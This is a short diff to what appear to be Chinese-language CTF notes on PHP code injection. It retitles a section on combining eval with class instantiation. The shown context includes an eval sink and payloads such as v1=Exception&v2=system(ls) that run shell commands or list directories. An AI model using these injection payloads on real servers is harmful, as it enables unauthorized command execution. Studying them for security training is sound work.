@@ -1,5 +1,5 @@
 
-## **eval和new**
+## **eval和new类结合**
 ```
 eval("echo new $v1($v2());");
 
@@ -27,3 +27,6 @@ v1=Exception&v2=system(ls)
 v1=FilesystemIterator&v2=getcwd
 eval("echo new FilesystemIterator(getcwd());");
 ```
+
+
+^
